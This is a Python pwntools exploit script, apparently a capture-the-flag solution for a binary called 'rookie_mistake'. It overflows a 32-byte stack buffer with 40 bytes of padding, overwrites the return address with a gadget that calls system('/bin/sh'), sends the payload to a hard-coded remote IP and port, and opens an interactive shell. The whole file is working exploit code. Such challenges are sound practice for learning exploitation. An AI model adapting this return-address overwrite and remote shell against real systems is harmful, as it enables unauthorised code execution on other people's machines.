#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64', os='linux')
context.log_level = 'info'

# Target binary
binary = './rookie_mistake'
elf = ELF(binary)

# Remote host details
REMOTE_HOST = '46.101.224.18'
REMOTE_PORT = 32232

# Win address - address of the gadget that calls system("/bin/sh")
# This is at 0x401758 in sym.overflow_core, right before it calls system
win_addr = 0x401758

# Create the payload
# Buffer is at rbp-0x20 (32 bytes)
# Then 8 bytes for saved rbp
# Then 8 bytes for return address
# Total offset = 40 bytes to reach return address
offset = 40
payload = b'A' * offset
payload += p64(win_addr)

log.info(f"Payload length: {len(payload)}")
log.info(f"Win address: {hex(win_addr)}")
log.info(f"Offset: {offset}")

# Connect to remote
log.info(f"Connecting to remote: {REMOTE_HOST}:{REMOTE_PORT}")
io = remote(REMOTE_HOST, REMOTE_PORT)

# Receive banner
log.info("Receiving banner...")
print(io.recvuntil(b'$', timeout=2).decode(errors='ignore'))

# Send the payload
log.info("Sending payload...")
io.sendline(payload)

# Interact with the shell
log.success("Exploit sent! Dropping to interactive shell...")
io.interactive()
